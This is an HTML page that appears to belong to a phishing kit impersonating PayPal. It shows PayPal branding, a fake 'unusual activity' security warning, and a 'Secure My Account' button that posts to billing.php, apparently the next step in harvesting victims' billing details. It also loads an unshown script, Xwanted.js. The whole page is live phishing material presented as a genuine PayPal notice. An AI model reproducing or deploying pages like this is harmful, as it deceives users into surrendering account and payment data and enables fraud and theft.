<!DOCTYPE html>
<html>
<head>
  <title>PayPal</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" type="text/css" href="assets/bulma.min.css">
  <link rel="stylesheet" type="text/css" href="assets/style.css">
<link rel="shortcut icon" href="assets/pp_favicon_x.ico" />
</body>
</head>
<body onload="spinner()">
<form action="billing.php" method="post">
<div style="max-width: 400px;margin: 0 auto;padding: 20px;">
    <center>
      <img src="assets/ppll.png" alt="" style="height: 37px;margin-top: 20%;"><br><br>
      <h1 class="text_safe">We noticed some unusual activity</h1><br>
      <br>
      <p class="content_safe">We need your help securing your account to prevent unauthorized access. For your safety, there may be some limitations on your account until you take action.</p>
      <br>
      <div class="columns is-multiline is-mobile" id="col">
      <div class="column is-12">
      <button name="btn" id="btn">Secure My Account</button>
      </div></div>
    </center>
</div>

<div class="spinner loading" id="spinner" style="display: none;"></div>
<br><br><br><br><br><br><br>
<div class="login_footer">
  <center>
    <p class="text_footer">Contact Us &nbsp;&nbsp;Privacy &nbsp;&nbsp;Legal &nbsp;&nbsp;Worldwide</p>
  </center>
</div>
<script src="https://code.jquery.com/jquery-3.3.1.js"></script>
<script type="text/javascript" src="assets/Xwanted.js"></script>
</form>
</body>
</html>